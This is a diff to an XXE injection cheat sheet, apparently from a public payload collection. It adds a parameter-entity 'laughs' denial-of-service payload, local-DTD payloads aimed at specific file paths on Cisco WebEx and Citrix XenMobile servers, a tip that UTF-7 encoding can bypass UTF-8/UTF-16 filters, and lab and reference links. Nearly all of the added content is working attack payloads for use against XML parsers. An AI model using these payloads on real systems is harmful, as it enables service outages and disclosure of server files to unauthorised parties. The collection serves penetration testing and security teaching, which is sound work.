@@ -20,6 +20,8 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-SSRF-attacks)
 - [Exploiting XXE to perform a deny of service](#exploiting-xxe-to-perform-a-deny-of-service)
   - [Billion Laugh Attack](#billion-laugh-attack)
+  - [Yaml attack](#yaml-attack)
+  - [Parameters Laugh attack](#parameters-laugh-attack)
 - [Error Based XXE](#error-based-xxe)
 - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
   - [Blind XXE](#blind-xxe)
@@ -228,6 +230,20 @@ h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
 i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
+### Parameters Laugh attack
+
+A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.
+
+```xml
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  %pe_4;
+]>
+<r/>
+```
 
 ## Error Based XXE
 
@@ -372,7 +388,18 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 ]>
 <root></root>
 ```
-
+### Cisco WebEx
+```
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
+<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
+### Citrix XenMobile Server
+```
+<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
+<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
 
@@ -591,11 +618,16 @@ we can convert the character encoding to `UTF-16` using [iconv](https://man7.org
 ```bash
 cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 ```
+UTF-7 encoding can be used as well to bypass UTF-8/UTF-16 rules.
 
+## Labs
+
+* [PortSwigger Labs for XXE](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
 
 ## References
 
 * [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+* [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 * [Detecting and exploiting XXE in SAML Interfaces](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html) - 6. Nov. 2014 - Von Christian Mainka
 * [[Gist] staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 * [[Gist] mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
@@ -616,3 +648,6 @@ cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 * [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube)
 * [SynAck - A Deep Dive into XXE Injection](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) - 22 July 2019 - Trenton Gordon
 * [Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK
+* [XXE: How to become a Jedi](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) - Zeronights 2017 - Yaroslav Babin
+* [Payloads for Cisco and Citrix - Arseniy Sharoglazov](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+
